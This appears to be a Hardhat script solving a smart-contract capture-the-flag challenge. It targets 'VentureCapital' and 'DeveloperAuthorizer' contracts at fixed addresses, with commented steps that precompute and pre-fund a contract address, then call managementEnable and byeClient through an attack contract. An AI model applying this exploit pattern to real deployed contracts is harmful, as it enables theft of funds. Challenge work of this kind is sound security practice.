const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const [player] = await hre.ethers.getSigners();
  const provider = ethers.provider;

  /* pre compute the target address
  const deployerAddr = '0x433ea2726686c1a4b9fcb0d48c03f261d922b3fb';
  const preComputedVCAddr = ethers.utils.getContractAddress({
      from: deployerAddr,
      nonce: await provider.getTransactionCount(deployerAddr)
  });
  console.log('preComputedVCAddr:', preComputedVCAddr);

  const preComputedDAAddr = ethers.utils.getContractAddress({
      from: preComputedVCAddr,
      nonce: 1
  });
  console.log('preComputedDAAddr:', preComputedDAAddr);
  */

  /* send ether to precomputed address
  const tx = await player.sendTransaction({
    from: player.address,
    to: preComputedDAAddr,
    value: ethers.utils.parseEther('0.424242')
  });
  await tx.wait();
  */

  const da = await ethers.getContractAt(
    require('../artifacts/contracts/VentureCapital.sol/DeveloperAuthorizer.json').abi,
    '0x9526a993f27d0aaf060516d4b603e080d8e879fa',
    player
  );
  console.log(await da.developerMode());

  const vc = await ethers.getContractAt(
    require('../artifacts/contracts/VentureCapital.sol/VentureCapital.json').abi,
    '0x8b33b51e486482ce7bfedb9a87c5809fe6caeaa1',
    player
  );

  // const VCAFactory = await ethers.getContractFactory("VentureCapitalAttack");
  // const vca = await VCAFactory.deploy(vc.address); // VentureCapital address
  // await vca.deployed();

  const vca = await ethers.getContractAt(
    require('../artifacts/contracts/VentureCapital.sol/VentureCapitalAttack.json').abi,
    '0x7ce4617c6C9ED2D3056d4b42434B7364F6f9C9A5',
    player
  );

  // const newClientTx = await vc.connect(player).newClient(player.address, 18, { value: ethers.utils.parseEther('0.01') });
  // await newClientTx.wait();

  const managementEnableTx = await vc.managementEnable(player.address);
  console.log((await managementEnableTx.wait()).transactionHash);

  const byeClientTx = await vc.byeClient({
    gasLimit: 2000000
  });
  console.log((await byeClientTx.wait()).transactionHash);
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
